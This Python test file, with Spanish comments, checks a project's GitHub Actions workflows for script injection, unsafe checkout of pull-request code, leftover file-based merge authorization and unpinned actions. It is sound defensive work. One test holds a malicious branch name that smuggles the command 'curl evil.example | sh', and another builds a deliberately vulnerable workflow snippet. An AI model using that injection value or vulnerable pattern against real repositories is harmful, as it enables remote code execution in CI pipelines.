"""Regresion de seguridad de v2.0.6 (M0.0b; ai-native P39b/P43; defectos B02/B04/B31).

Plano de control como datos: estos tests leen los workflows como texto y verifican
que (1) ninguna expresion controlada por un atacante se interpola en un script,
(2) ningun workflow con token de escritura ejecuta codigo del head de una PR, y
(3) la autorizacion reutilizable por archivo ya no existe en el gate post-HITL.
Sin pyyaml (no esta en requirements-dev.txt): aserciones sobre texto plano.
"""

import re
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
WORKFLOWS = sorted((ROOT / ".github" / "workflows").glob("*.yml"))
HITL = ROOT / ".github" / "workflows" / "post-hitl-merge-gate.yml"
CLOSE = ROOT / ".github" / "workflows" / "post-merge-close-feature.yml"

# Campos que controla el autor de una PR / issue (ramas, titulos, cuerpos, metadatos de commit).
UNTRUSTED = re.compile(
    r"\$\{\{[^}]*\b(github\.(head_ref|ref_name|ref)\b|github\.event\.(pull_request\.(title|body|head\.(ref|label|repo\.[a-z_]+))"
    r"|issue\.(title|body)|comment\.body|review\.body|review_comment\.body|discussion\.(title|body)"
    r"|head_commit\.(message|author\.(name|email))|workflow_run\.(head_branch|display_title)))[^}]*\}\}",
    re.IGNORECASE,
)


def script_injection_lines(text: str) -> list[int]:
    """Lineas (1-based) con una expresion no confiable dentro de un cuerpo run:/script:."""
    hits: list[int] = []
    block_indent = None
    for number, line in enumerate(text.splitlines(), start=1):
        indent = len(line) - len(line.lstrip())
        if block_indent is not None:
            if not line.strip() or indent > block_indent:
                if UNTRUSTED.search(line):
                    hits.append(number)
                continue
            block_indent = None
        m = re.match(r"^(\s*)(?:-\s+)?(run|script):\s*(.*)$", line)
        if not m:
            continue
        block_indent = len(m.group(1)) + (2 if re.match(r"^\s*-\s", line) else 0)
        if UNTRUSTED.search(m.group(3)):
            hits.append(number)
    return hits


def test_no_workflow_interpolates_untrusted_input_into_a_script():
    offenders = {w.name: script_injection_lines(w.read_text(encoding="utf-8")) for w in WORKFLOWS}
    assert {k: v for k, v in offenders.items() if v} == {}


def test_detector_catches_the_v205_b31_pattern():
    """El detector no es una tautologia: reconoce el patron vulnerable de v2.0.5."""
    vulnerable = (
        "jobs:\n  a:\n    steps:\n      - run: |\n"
        "          head_ref='${{ github.event.pull_request.head.ref }}'\n"
    )
    assert script_injection_lines(vulnerable) == [5]
    safe = (
        "jobs:\n  a:\n    steps:\n      - env:\n          HEAD_REF: ${{ github.event.pull_request.head.ref }}\n"
        "        run: |\n          head_ref=\"$HEAD_REF\"\n"
    )
    assert script_injection_lines(safe) == []


def test_malicious_branch_name_has_no_effect_in_the_slug_step():
    """Una rama con una inyeccion de shell llega solo como dato por env y no matchea ninguna regex valida."""
    text = HITL.read_text(encoding="utf-8")
    assert 'HEAD_REF: ${{ github.event.pull_request.head.ref }}' in text
    assert 'head_ref="$HEAD_REF"' in text
    malicious = "feature/01-x'; curl evil.example | sh; echo '"
    valid = re.compile(r"^feature/([0-9]{2}-[a-z0-9]+(-[a-z0-9]+)*)$")
    assert not valid.match(malicious)


def test_post_hitl_gate_never_checks_out_or_runs_pr_code():
    text = HITL.read_text(encoding="utf-8")
    assert "github.event.pull_request.head.sha" not in text
    assert "pull_request.base.sha" in text
    assert "persist-credentials: false" in text
    assert "persist-credentials: true" not in text


def test_post_hitl_gate_workflow_comes_from_base_not_from_the_pr():
    """'pull_request' toma el workflow de la PR; 'pull_request_target' de la base."""
    text = HITL.read_text(encoding="utf-8")
    assert "pull_request_target:" in text
    assert not re.search(r"^  pull_request:\s*$", text, re.MULTILINE)


def test_post_hitl_gate_has_no_file_based_authorization():
    # sin comentarios: el encabezado explica justamente lo que se elimino
    lines = HITL.read_text(encoding="utf-8").splitlines()
    text = " ".join(line for line in lines if not line.lstrip().startswith("#"))
    for needle in ("PreAuthorizedHumanMerge", "AuthorizationPath", "IndependentReviewPath", "IntegrityEvidencePath", "human-authorization"):
        assert needle not in text, needle
    assert "-GovernanceMode MultiMaintainer" in text


def test_write_token_workflows_do_not_check_out_the_pr_head():
    for workflow in WORKFLOWS:
        text = workflow.read_text(encoding="utf-8")
        if not re.search(r"^\s*pull_request_target:", text, re.MULTILINE):
            continue
        assert not re.search(r"ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.(sha|ref)", text), workflow.name
        assert not re.search(r"ref:\s*\$\{\{\s*github\.head_ref", text), workflow.name


def test_post_merge_close_feature_stays_on_develop():
    text = CLOSE.read_text(encoding="utf-8")
    assert "ref: develop" in text
    assert "github.event.pull_request.head.sha" not in text
    assert 'head_ref="$HEAD_REF"' in text


def test_actions_stay_pinned_by_sha():
    for workflow in WORKFLOWS:
        for line in workflow.read_text(encoding="utf-8").splitlines():
            m = re.match(r"^\s*(?:-\s+)?uses:\s*([^\s#]+)", line)
            if m and not m.group(1).startswith("./"):
                assert re.search(r"@[0-9a-f]{40}$", m.group(1)), f"{workflow.name}: {m.group(1)}"
